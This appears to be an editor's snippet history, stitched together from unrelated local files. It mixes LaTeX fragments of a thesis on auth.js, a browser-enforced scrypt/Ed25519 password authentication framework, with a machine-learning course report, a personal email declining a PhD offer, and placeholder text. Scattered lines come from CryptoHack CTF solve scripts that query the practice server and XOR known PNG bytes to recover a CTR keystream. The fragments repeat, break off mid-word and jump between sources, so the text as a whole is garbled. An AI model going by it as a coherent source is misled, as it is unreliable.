	In the following example, we depict how a server chooses to use the {\tt scrypt\_seed\_ed25519\_keypair} authentication scheme, with a minimum of 8 characters for the password. The web application HTML code directs the user to retrieve {\tt auth.js} from a trusted source. The API calls of {\tt auth.js}, {\tt register} and {\tt authenticate}, are then used to generate the correct credentials that the web application can now send to the server.
	
	\begin{lstlisting}[caption={\textbf{Web application html file.} The client is directed to get {\tt auth.js} from a truted source.}, label={lst:html}]
	<html>
	<head>
	...
	<script type = "text/javascript" src = "https://trusted.com/auth.js"></script>
	<script type = "text/javascript" src = "myjs.js"></script>
	...
	</head>
	<body>
	/* Registration and login form */
	</body>
	</html>
	\end{lstlisting}
	
	\begin{lstlisting}[caption={\textbf{Web application JavaScript file.} The minimum password length and authentication scheme are initialized. The register and authenticate API calls are called when a user tries to register to or authenticate with the server. auth.js generates the correct credential based on the user's password, and the credential is then sent to the server along with other necessary information, such as the user's username}, label={lst:init_authjs}]
	  ...
	  initializeCredentialType({
	    passwordMinLength: 8,
	    passwordProccessMethod: "scrypt_seed_ed25519_keypair",
	  });
	  ...
	    let password = document.getElementById("password");
	  ...
	      /* On registration action */
	    let credential = register(password); 
	  ...
	      /* On login action */
	    let message = document.getElementById("nonce");
	    let credential = authenticate(password, message);
	  ...
	  /* Send credential and other necessary information to the server */ 
	\end{lstlisting}
	
	
e331bffcd666f93b0add2f86f8133bca|file:///home/neo/Documents/thesis/architecture.tex|1|1|V|tex
	\chapter{Architecture}
	\label{sec:architecture}
0311142ac53241c01d8e91061833921f|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|1|1|V|tex
	\section{Background}\label{sec:background}
	
	\subsection{Conventional password authentication}
	The most common authentication scheme used in the web is normal password authentication. 
	
	A general overview of how this scheme works is the following: Firstly, when a user registers a new account, he sends his password over a (usually encrypted) channel to the web server. The web server uses a cryptographic hash function to compute the hash of the user's password and stores the hash, along with other information about the user, such as their username.
	
	When the client wants to authenticate itself to the server, the user is prompted for their password and the password is sent back to the server. At the server, the hash of the password is computed again and compared against the stored hash. If the two hashes match, the authentication is successful and the user is logged in.
	
	\subsection{Public key authentication}
	An alternative authentication method is public key authentication. 
	
	For this authentication scheme, the client does not send his password to the server it wants to register to. Instead, it generates a key pair consisting of a public key, which gets sent to the server, and a private key, which the client stores locally.
	
	For authentication, the client informs the server that it wants to authenticate. The server then sends a message to the client and the client uses their stored private key to sign the message, in order to prove ownership of the private key. The signed message is sent back to the server, and the server verifies the signature using the stored public key of the user. If the verification is successful, the user is again logged in.
	
	\subsection{Keybase authentication}
	Keybase \cite{keybase} is a service which offers to its users the ability to prove their identity on social media platforms by mapping their profiles to generated encryption keys. It also offers end-to-end encrypted messaging between its users, an encrypted cloud storage system and other services. Keybase uses a public key authentication system which works as follows. When a new user tries to sign up \cite{keybase-signup}, they firstly type in a password. However, the password does not directly get submitted to the server. Keybase uses its signup API call to generate a random salt value and an {\tt scrypt} hash is generated using the password and the salt. Some bytes of the generated hash value are interpreted as an EdDSA private key, which is then used as a seed to another function to generate the corresponding EdDSA public key. This public key is sent to the Keybase server and is stored as the user's credential. At the login phase \cite{keybase-login}, the EdDSA private key is recomputed similarly to the signup phase. In order to prove ownership of the key, the client recomputes the private key by prompting the user to re-type their password. Using this key, the client creates a signature which is verified by the server using the stored public key of the user.
99bf1861f3dd5ac6dc2435dc892b965c|file:///home/neo/Documents/thesis/background.tex|1|1|V|tex
	
	\chapter{Background}
	\label{sec:background}
	
bb147589a22eac1a89acfc25d6a5aac9|file:///home/neo/Documents/thesis/evaluation.tex|1|1|V|tex
	\chapter{Evaluation}
	\label{sec:evaluation}
441101f2649ba10395e4baaeb70ef7aa|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|1|1|V|tex
	\section{Evaluation} \label{sec:evaluation}
	
	In this section we evaluate the performance of {\tt auth.js} and particularly the overhead that the public key authentication system adds over the traditional password authentication method.
	
	\subsection{Setup}
	For the following measurements, we used two Linux machines running Ubuntu 18.04 LTS. The first machine run a dummy server with minimal functionality. The second machine run a fork of Mozilla Firefox Nightly 73.0a1, compiled with the disable optimizations and enable debug options.
	
	\subsection{Average time for posting credentials on the server and getting a reply}
	We measured the average time for generating and posting a user's credentials using the two authentication methods, traditional password authentication and public key authentication, from the machine running Firefox to the machine running the dummy server. For checking the password, the dummy server simply check if the posted password matched the user's stored password in its database. For checking the posted signature, the server run the Python script mentioned in Section~\ref{sec:implementation}. Table~\ref{tab:post_avg} presents the average time for 1000 repetitions.
	
	\begin{table}[ht]\label{tab:post_avg}
	\centering
	\caption{Average time for generating key pairs and signatures}
	\begin{tabular}{@{}ll@{}}
	Credential posted & Average time \\ 
	Password          & 260 ms       \\
	Signature         & 328 ms       \\ 
	\end{tabular}
	\end{table}
	\neochr{Fix table formatting}
	\subsection{Average time for key pair and signature generation}
	We measured the performance of {\tt auth.js} for creating Ed25519 key pairs and signing messages using the private key of the pair. We split the measurement in 3 parts: the time for only generating key pairs with a given password, the time for only signing a given message with a given key pair, and the time for both generating a key pair using a given password and signing a given message with the generated private key. Table~\ref{tab:generate_avg} presents the average time for these three measurements for 10 thousand repetitions.
	 
	\begin{table}[ht]\label{tab:generate_avg}
	\centering
	\caption{Average time for generating key pairs and signatures}
	\begin{tabular}[t]{lc} 
	&Average time\\
	Generate key pair                & 30.9 ms \\
	Sign message                     & 29.5 ms \\
	Generate key pair + sign message & 59.3 ms
	\end{tabular}
	\end{table}
a8f978053fc2a0f50f75c85eaca56632|file:///home/neo/Documents/thesis/implementation.tex|1|1|V|tex
	\chapter{Implementation}
	\label{sec:implementation}
	
f275ce61b2e1015ca8c73fa97e5e2844|file:///home/neo/Documents/thesis/implementation.tex|5|1|V|tex
	% \elathan{Replace footnote with reference.}
115b0e5fedfe7a8fd91acc3f69858181|file:///home/neo/Documents/thesis/implementation.tex|9|1|V|tex
	%Then, we located the files inside NSS that contain the calls to the
	%implementation of already existing hash functions, such as {\tt SHA256} and
	%added the corresponding functions for {\tt scrypt}. 
74a3a30705be741a8e964b1d2e6c4e22|file:///home/neo/Documents/thesis/implementation.tex|9|26|V|tex
	%We finally modified those
	%functions to call the added {\tt scrypt} implementation to perform the hashing
77f3b2b614391d9bf23cdeb7a54bc59b|file:///home/neo/Documents/thesis/implementation.tex|10|1|V|tex
	%operation (see Listing~\ref{lst:sha512.c} for an example). 
8953232a5598d88fef3a46f849f602df|file:///home/neo/Documents/thesis/introduction.tex|1|1|V|tex
	\chapter{Introduction}
	Once upon a time~\cite{cfi-attack}.
	
	The Art of Computer Programming (sometimes known by its initials TAOCP) is a
	comprehensive monograph written by Donald Knuth that covers many kinds of
	programming algorithms and their analysis.
	
	Knuth began the project, originally conceived as a single book with twelve
	chapters, in 1962. The first three volumes of what was then expected to be a
	seven-volume set were published in 1968, 1969, and 1973. The first published
	installment of Volume 4 appeared in paperback as Fascicle 2 in 2005. The
	hardback Volume 4A, combining Volume 4, Fascicles 0-4, was published in 2011.
	Volume 4, Fascicle 6 ("Satisfiability") was released in December 2015, to be
	followed by Volume 4, Fascicle 5 ("Mathematical Preliminaries Redux;
	Backtracking; Dancing Links") in October 2018. Fascicles 5 and 6 are expected
	to comprise the first two thirds of Volume 4B.
19fbbfdc430ee89038d3bc132d5381a5|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|1|1|V|tex
	\section{Introduction}
	
	Authentication is vital for the majority of on-line web applications.  Through
	the process of authentication, services can distinguish their users and offer
	dynamically generated and personalised content.  Unfortunately, the
	authentication process is often an attractive target for attackers.  The goal
	of attackers is to impersonate users by stealing their credentials and
	therefore have access to their data.  Notice that, beyond accessing sensitive
	data, the attacker can also \emph{generate} information on behalf of the
	compromised user~\cite{twitter-spam}~\cite{social-network-spam}.
	%(cite here papers for Twitter/Facebook spam/like economy).
	
	Several attacks exist depending on the way authentication is implemented. In
	the case of text-based passwords, it is common to salt, cryptographically hash,
	and store them at the server. The mechanics of the password protection, which is based on
	storing the password hashed at the server, coerces the user to \emph{reveal}
	their plain password to the server each time they log in, which is very likely
	to already be used in other services, as well. A malicious server could then 
	use the user's plain password to try to take control of another account of the
	same user in another service. This can be dramatically augmented due to
	password reuse~\cite{password-reuse}, where users recycle passwords among
	different services. 
	% Attackers can then leverage application vulnerabilities and leak the database in order to crack all stored digests~\cite{sauth,honeywords}. 
	
	On the other hand, advances in cryptography have developed all necessary tools
	for realizing protocols that do more than simply sending a string 
	to be salted and hashed. For instance, several protocols for Password
	Authentication Key Agreement (PAKE)~\cite{pake} permit a password to act as a
	seed for generating cryptographic keys. Regardless of the actual implementation,
	such schemes allow users to send a secret to the server for authenticating
	instead of the password in plain. The secret is cryptographically connected
	with the password and, therefore, even non-trusted servers must perform
	cracking attacks for revealing a user's password.
	
	Despite the availability of such protocols, services continue to base their
	authentication on hashing plain passwords. An exception to this rule is
	Keybase~\cite{keybase}, a service which offers cryptographic functions to users
	(for instance encrypted chat, filesystem and version control).  Keybase assumes
	that the password (or \emph{passphrase}, as they call it) of the user serves as a
	seed for generating a pair of keys that belong to an elliptic
	curve~\cite{ed25519}.  The private key is generated on the fly by the browser
	and allows the user to sign a message that is validated using the public key
	stored at the Keybase server. Thus, the password of the user is never revealed
	to Keybase, while complex handling of cryptographic keys is not an issue; the
	keys can be re-generated from the passphrase every time the user logs in (from
	any device).
	
	Unfortunately, Keybase implements all this functionality, including the cryptographic
	operations, using its own code and does not use the browser's engine to do so.
	A web site may advertise that supports a Keybase-like authentication process, where the 
	password of the user is never revealed to the server, in order to convince users to register with it.
	However, unless the cryptographic primitives are executed in a secure context,
	it is unclear whether the aforementioned web site implements the authentication
	algorithm correctly or deliberately violates it in order to read the user's password.
	
	In this paper, we build a framework for allowing any web site to offer advanced
	authentication, where plain passwords are used but are never exposed to any server.
	In particular, we design, implement and evaluate {\tt auth.js}, an
	authentication framework with a JavaScript interface, which allows developers
	to enable any PAKE-like protocol in their apps. As a proof-of-concept, we use
	{\tt auth.js} to enable Keybase-like authentication to WordPress with just a
	few code modifications. {\tt auth.js} can be used through JavaScript, however,
	all cryptographic primitives are enforced by the browser engine, which we assume
	trusted. For this, we extend Mozilla Crypto with more cryptographic
	primitives, such as {\tt scrypt} and the edwards25519 elliptic curve.
	
	\subsection{Contributions}
	To summarize, this paper contributes:
	
	\begin{itemize}
	
	\item we extend Mozilla Crypto with more cryptographic primitives, such as {\tt
	scrypt} and the edwards25519 elliptic curve --although this is a solely engineering
	task, we consider it important for enabling new cryptographic capabilities for
	web applications;
	
	\item we design and realize {\tt auth.js}, a framework that allows a web
	application to offer advanced authentication that leverages sophisticated
	techniques compared to typical cryptographically hashed text-based passwords;
	
	\item {\tt auth.js} can be easily enabled in all web applications and supports
	traditional passwords -- however, once enabled, switching to a more elaborate
	scheme is straight forward; 
	
	\item we evaluate {\tt auth.js} with real web applications, such as WordPress.
	
	\end{itemize}
60b2ce081da11db34fe9563897d5f8b5|file:///home/neo/Documents/thesis/introduction.tex|11|1|V|tex
	%(cite here papers for Twitter/Facebook spam/like economy).
51f969177dac6b0cebfd1a014d6252a4|file:///home/neo/Documents/diplomatiki/auth.js/related.tex|1|1|V|tex
	\section{Related Work}\label{sec:related}
	
	\subsection{Advanced authentication schemes}
	Apart from the public key authentication scheme we presented, various more authentication methods exist. PAKE protocols such as SRP~\cite{srp} allow clients to authenticate themselves to a server and exchange a secret securely, without needing to send their actual password. Even though certain PAKE protocols have seen some adoption, many of them have not been successfully deployed yet. Other password-based authentication mechanisms which are based on PAKE protocols, such as \cite{strong-authentication}, are also starting to get proposed. {\tt auth.js} can serve as a single framework from which such protocols can be deployed. As long as the cryptographic primitives needed for a protocol are implemented in the client's browser, {\tt auth.js} can securely enforce their usage, assuming of course that the browser is not compromised. A web programmer who wishes to use another scheme for authenticating users can do so simply by changing the {\tt passwordProccessMethod} field in their forms to the authentication scheme of their choosing and transparently switch to a new authentication method, assuming that the server also supports the use of a chosen protocol. 
	The autentication scheme mentioned in this paper is based on the authentication scheme used by Keybase \cite{keybase}. The major difference is that Keybase uses its own source code to perform the cryptographic operations, while {\tt auth.js} uses the cryptographic primitives that are built in the user's browser, ensuring that the operations will be performed securely.
	
	\subsection{Cryptographic primitives}
	In the recent years, many improvements have been made and many new cryptographic primitives have been introduced, which are not yet implemented by the major web browsers. For our work, we added the scrypt \cite{scrypt_hash} hash function as well as the Curve25519 elliptic curve \cite{ed25519} to Mozilla Firefox and specifically in the Web Crypto API, in order to use them for our authentication scheme. We expect that those cryptographic primitives, as well as more primitives such as the bcrypt \cite{bcrypt}, Argon2 \cite{argon2} and blake2 \cite{blake2} hash functions or new elliptic curves such as the FourQ curve \cite{fourq} will eventually be implemented in the major web browsers and will be available to use. As more and more cryptographic primitives are added, {\tt auth.js} can be modified to support the usage of these primitives to create new authentication schemes. Other projects have also explored the extension of the Web Crypto API functionality to add support for other operations, such as document signing \cite{webcrypto_signing}. New types of cryptographic primitives are also starting to get implemented. For example, Microsoft's SEAL \cite{sealcrypto} provides an API that can be used to perform homomorphic encryption.
	
	\subsection{Cryptography frameworks}
	Other frameworks have also tried making advanced cryptography more accessible and easier to use. For example, Let's Encrypt \cite{letsencrypt-https}, \cite{letsencrypt2} makes it easy to obtain a TLS certificate without the need of human intervention. Keybase is another web service that offers advanced cryptography to simple users, such as an advanced authentication scheme, end-to-end encryption, public identity verification and encrypted storage.
8832df7966e9d0e4910df85a354eaa01|file:///home/neo/Documents/thesis/related-work.tex|1|1|V|tex
	\chapter{Related Work}
	\label{sec:related-work}
	
0c98031765e059ef9a256bd5a7903860|file:///home/neo/Documents/thesis/thesis.tex|64|2|V|tex
		pagebackref	= true,
838f9ce89dde229d3aa800db717d1d1a|file:///home/neo/Documents/thesis/thesis.tex|29|21|v|tex
	MyThesis
37a0c79f50954be39245b413ea28660d|file:///home/neo/Documents/thesis/thesis.tex|30|16|v|tex
	keyword1, keyword2
d6fe3a6ff9701782acf95e15ae8ccc9f|file:///home/neo/Documents/thesis/thesis.tex|37|48|v|tex
	yourhandle:
1f517a2b16b0513fcf391a33f7bb0384|file:///home/neo/Documents/thesis/thesis.tex|98|16|v|tex
	Student Name
9689c50d8c6589994e60b6fc8dba2bf0|file:///home/neo/Documents/thesis/thesis.tex|163|1|V|tex
	\input{abstract}
157e50ed1533ac96c512892eb486939c|file:///home/neo/Documents/thesis/abstract.tex|2|1|V|tex
	
	Several research works attempt to replace simple authentication schemes, where
	the cryptographic digest of a plaintext password is stored at the server. Those
	proposals are based on more elaborate schemes, such as PAKE-based protocols.
	However, in practice, only a very limited amount of applications in the web use
	such schemes. The reason for this limited deployment is perhaps 
	their complexity as far as the cryptography involved is concerned.
	Today, even the most successful web applications use text-based
	passwords, which are simply hashed and stored at the server. This has broad implications
	for both the service and the user. Essentially, the users are forced to reveal
	their plain passwords for both registering and authenticating with a service.
	
	In this thesis, we attempt to make it easier for any web service to a) enable
	easily advanced authentication schemes, and b) switch from one scheme to
	another.  More precisely, we design and realize {\tt auth.js}, a framework that
	allows a web application to offer advanced authentication that leverages
	sophisticated techniques compared to typical cryptographically hashed
	text-based passwords. In fact, {\tt auth.js} can be easily enabled in all web
	applications and supports traditional passwords -- however, once enabled,
	switching to a more elaborate scheme is straight forward. {\tt auth.js}
	leverages advanced cryptographic primitives, which can be used for implementing
	strong authentication, such as PAKE and similar solutions, by ensuring that all
	cryptographic primitives are trusted and executed using the browser's engine. For
	this, we extend Mozilla Crypto with more cryptographic primitives, such as {\tt
	scrypt} and the edwards25519 elliptic curve. Finally, we evaluate {\tt auth.js}
	with real web applications, such as WordPress.
	
f0de24ca4be936b0d28a15c4eade98c7|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|16|1|V|tex
	Hello, here is some text without a meaning.  This text should show what 
50cf5d22a0503d12efe64c0baaab2317|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|16|1|V|tex
	a printed text will look like at this place.
d2846efed637315e6be7fb32cac0dd65|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|16|1|V|tex
	If you read this text, you will get no information.  Really?  Is there 
24faef50fe03069a4a2ad963332d51d3|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|16|1|V|tex
	no information?  Is there...
7fb55ed0b7a30342ba6da306428cae04|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|15|10|v|tex
	First
4bff484fd99e2aa110dc044d529bc663|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|15|10|v|tex
	 Section
4a7b1fea58de6c4f6ec7e73e6c309a79|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|16|30|v|tex
	a subject t
a44a876d82a60d2e27d7b16cbef8498b|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|17|59|v|tex
	(Real or Not? NLP with Disaster Tweets)
b86877c84d45df4acce5e677bf6963b1|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|17|59|v|tex
	https://www.kaggle.com/c/nlp-getting-started/overview
a61ee7fa525e9d2e07b9239365220898|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|17|119|v|tex
	Real or Not? NLP with Disaster Tweets
67e92c8765a9bc7fb2d335c459de9eb5|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|36|26|v|tex
	work
8f1532ef7e8ee75f2c01f4b8a96ff448|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|52|5|V|tex
	    For example, we can choose to only clear the data and vectorize them with the TfIdf vectorizer, and not use any other preprocessing method. 
7e768e693b82962a83c86fdf1f8b201b|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|51|5|V|tex
	\item Because we don't know what the best combination of preprocessing methods is for each model, add an option for each method so that we can choose which of these methods will be used to preprocess the data in each run.
	    For example, we can choose to only clear the data and vectorize them with the TfIdf vectorizer, and not use any other preprocessing method. 
ae3bb7032da5448a7b5b161de553d96c|file:///tmp/neomutt-neo-1000-12251-11262078357501536267|3|1|V|mail
	I was offered a position for the PhD CS program for the Fall 2020
	semester. I appreciate getting admitted, but, unfortunately,
	I would like to inform you that I will not pursue a degree at Texas A&M
	for the time being.
f27db86d9fc8a7d6f3aed3b3617cfbb3|file:///home/neo/cryptohack/block-ciphers/cbc/flipping.py|1|1|V|python
	#!/usr/share/python3
0904f6666ecf1313f6831bfbe5613ca1|file:///home/neo/cryptohack/block-ciphers/cbc/flipping.py|1|1|V|python
	#!/usr/share/python3
	import requests, string
	from Crypto.Cipher import AES
	from Crypto.Util.Padding import pad, unpad
3fcb929d37bf3eff2879f1e500390c47|file:///home/neo/cryptohack/block-ciphers/cbc/flipping.py|15|1|V|python
	if __name__=='__main__':
d1695c460ea0156febd9eb0bf2dd3489|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|6|1|V|python
	URL_ENCRYPT = 'https://aes.cryptohack.org/lazy_cbc/encrypt/'
8f3db38b6952d2108598f82c98c2af00|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|7|1|V|python
	URL_FLAG = 'https://aes.cryptohack.org/lazy_cbc/get_flag/'
0f4d0db3668dd58cabb9eb409657eaa8|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|8|5|v|python
	FLAG
7d03aaa2bf93d80040f3f22ec6ad9d5a|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|8|52|v|python
	get_flag
9deb7aa44cd0c3b7518b9ea2cebcbe03|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|16|5|V|python
	    print(decrypted.json())
4e25ba7b768bcc38f9f126e02974531a|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|15|1|V|python
	    ct_first_block = ciphertext[0:16]
1814f9e84e5cf731ff6125c82783ad05|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|34|5|V|python
	    if 'error' in decrypted:
d08be66191759fcbb44595798371ebf1|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|35|5|V|python
	        print(decrypted['error'])
204c619c57d3d4b62b29c3f4205a8142|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|36|9|V|python
	        print(err)
6e47da7586f5b82f2bc7570cd0f400bd|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|37|9|V|python
	        pt_b
bfa7dab6a6839a237cfe3671def5428f|file:///home/neo/cryptohack/block-ciphers/cbc/flipping.py|6|1|V|python
	import sys, string, binascii
	sys.path.insert(1, '~/cryptohack')
	from general.xor.xor import *
c0786e30bdd41cd517ec5365de07a659|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|60|42|v|tex
	([])
b447ae4d336bb978ad8fb34af486b047|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/final_parameters_scores%200.2%2030.csv|3|1|V|
	15,0.2,30,exponential,0.726905898828677
536b6858dfb28ef09147674a482d1b89|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|89|1|V|tex
	    \item KNeighborsClassifier
	    \item LogisticRegression
	    \item SGDClassifier
	    \item SVC (Support Vector Classifier)
	    \item BernoulliNB
	    \item DecisionTreeClassifier
	    \item GaussianNB
	    \item GradientBoostingClassifier
	    \item MultinomialNB
d1a396344d49380e8f760e710767ba6f|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|103|1|v|tex
	\item SVC
fe81776d7439708b9cf5330bf69d599a|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|118|1|V|tex
	The parameters we used for each model, as well as the values used for each parameter are described next. Similarly to the combinations of methods for preprocessing the data, we also created a script that runs all the possible combinations of values for all the parameters of each model. This way, we could find the best possible combination of parameter values for each model.
3af7a8ce36ef6b8a7ef180053f45da36|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|9|1|V|python
	URL_ENCRYPT = 'https://aes.cryptohack.org/lazy_cbc/encrypt/'
	URL_FLAG = 'https://aes.cryptohack.org/lazy_cbc/get_flag/'
b50ce711f7795943174173affbce8006|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|7|43|v|python
	lazy_cbc
f8bc5dacae6df3b6b70e9f08a4173734|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|2|1|V|python
	import requests, string
43c4cdef20cf6c90a5f31d150e8ecab2|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|12|5|V|python
	    print(encrypted_flag)
f37f467cefc14fbd10e0c14bc89e5ddb|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|14|5|V|python
	    cipher = AES.new(KEY, AES.MODE_OFB, iv)
162125db3930dab2a995b8054a64147f|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|18|1|V|python
	    print(len(encrypted_flag))
e252f221e9dbb17fe1a2aaf5718c7cc9|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|11|1|V|python
	    encrypted_flag = requests.get(url= URL_FLAG).json()['ciphertext']
8beab016d40e546b0a4f2528242883b4|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|12|56|v|python
	['ciphertext']
a126524408e42c02bc43a9b89b6d3b16|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|12|5|V|python
	    encrypted_flag = requests.get(url= URL_FLAG).json()
71d2fbab5a594facef07cdb340ea729c|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|13|5|V|python
	    print(len(flag_iv))
925bcc007c78faf0ef00f2d16cd4759c|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|13|5|V|python
	    print(flag_iv)
2cc68e07db84b3a20ffbb59f66d8755b|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|15|1|V|python
	    iv = b'a' * 16
f2fa167d6fec2ea7d8c51159ef7196af|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|16|5|V|python
	    plaintext = b'b' * 16
fbf689ebd926c932869f8eb1aedadb7d|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|17|5|V|python
	    print(encrypted_test) 
bc0c1f26e5b6dfed889c9dd0be83f145|file:///home/neo/cryptohack/block-ciphers/ofb/solve.py|19|1|V|python
	    first_enc_output = xor_bytes(first_test_block, b'b' * 16)
adfcd3e71c278d7e3ef8b5e4b88a49f1|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|2|1|V|python
	import requests, string
	from Crypto.Cipher import AES
	from Crypto.Util.Padding import pad, unpad
	import sys, string, binascii
	sys.path.insert(1, '~/cryptohack')
	from general.xor.xor import *
c7d4d7d089bc900a870b282fe093ae0e|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|3|1|V|python
	from Crypto.Util.Padding import pad, unpad
0ab52afb7d01187b2643df734abec895|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|9|1|V|python
	URL_ENCRYPT
b8f07eecbfd421b0a2c5d3f34e4a5f59|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|11|5|V|python
	    print(encrypted_flag) 
c5e46bed5ac36cd5fe5454e9fc3b4beb|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|32|1|V|python
	    print(encrypted_flag.hex()) 
b3035a4704c66234697091adfd346807|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|32|5|V|python
	    print(len(encrypted_flag)/16)
57cf0e0c6c29a8c5a928c74e71e83743|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|18|13|V|python
	            print()
5f6117d0481844adaacb83149192da07|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|14|9|V|python
	        print(self.value)
07f0b959ae183899b6176bb1f9423103|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|20|1|V|python
	            print(self.newIV)
67f2453c9206bcf780b17b11356979b5|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|34|4|V|python
	    for i in range(10):
	        ctr.increment()
80994f0ac60c9955797d3360bfc352bb|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|34|5|V|python
	    print(PNG_LAST_CHUNK)
4b87c77c8684e80f8510993746a5cf78|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|32|1|V|python
	    xor_block_first_bytes = xor_bytes(PNG_HEADER, encrypted_flag[:8])
ee354eb09a2f7553685c3d8e2bdaa188|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|35|37|V|python
	    PNG_HEADER = b'\211PNG\r\n\032\n'
	    PNG_LAST_CHUNK = bytes.fromhex('49454e44ae426082')
c040d62d88bf81bf1b2943a3e66ea483|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|29|1|V|python
	    # enc_file = open('block-ciphers/ctr/enc_flag.png', 'wb')
	    # enc_file.write(encrypted_flag)
	    # enc_file.close()
05cbd47455ec967d7538cd32fcd27ad8|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|33|34|V|python
	    dec_file.write(encrypted_flag)
	    dec_file.close()
79e8e6b2b86bfa6e792e2d548aa43fe2|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|39|5|V|python
	    ctr = StepUpCounter()
f75569f71d9aa1ef84e669c59ab8f5fe|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|41|5|V|python
	    dec_file.write(encrypted_flag)
3973d1071299fcf78c96b06723df4e11|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|39|5|V|python
	    blocks = len(encrypted_flag)//16 + 1
52aa86df55ee374b446a54db0b250fe9|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|44|1|V|python
	        print(len(block))
39eb42c7752ff6248a84580c2e031005|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|44|9|V|python
	        print(len(xor_block))
355da2ea3bfe9870bde18b733dd85aa0|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|41|5|V|python
	    print(xor_block)
4d9e33e52227e5464a908cd9f7302a65|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|37|1|V|python
	    xor_block_second_bytes = xor_bytes(PNG_LAST_CHUNK, encrypted_flag[-8:])
54bda89ebd0a71725d424a9a6f3056fe|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|41|31|v|python
	LAST_CHUNK
356437c07625bd57622cd153f92e145d|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|34|1|V|python
	    # PNG_HEADER = b'\211PNG\r\n\032\n'
	    # PNG_LAST_CHUNK = bytes.fromhex('49454e44ae426082')
	    # xor_block_first_bytes = xor_bytes(PNG_HEADER, encrypted_flag[:8])
	    # xor_block_second_bytes = xor_bytes(PNG_LAST_CHUNK, encrypted_flag[-8:])
	    # xor_block = xor_block_first_bytes + xor_block_second_bytes
9131485324e036fa6abd2b7dd66e28e9|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|1|1|V|python
	import requests, string
	from Crypto.Cipher import AES
	import sys, string, os
	sys.path.insert(1, '~/cryptohack')
	from general.xor.xor import *
2fe44a1af95b714629b6e43b1f2f4921|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|7|1|V|python
	URL_FLAG = 'https://aes.cryptohack.org/bean_counter/encrypt/'
43ad10695371aaa9279cea9a0ad30f22|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|7|43|v|python
	bean_counter
f3543bf4d47210f91af2dea7d7d23523|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|11|1|V|python
	    #     plaintext = bytes(c,'utf-8').hex()
	    #     ciphertext = requests.get(url=URL_ENCRYPT + plaintext + '/').json()['ciphertext']
	    #     print(len(ciphertext))
2acb3c622363ea3ca6f5a0feeb3c642a|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|10|23|v|python
	printable
f4011471f23c00b4045f67dc05f0a1b5|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|46|1|V|python
	keys_pairs = map(''.join, product(string.printable, repeat=2))
7da619d5ed5265d37c1ffefa5c5177e9|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|17|5|v|python
	keys_pairs
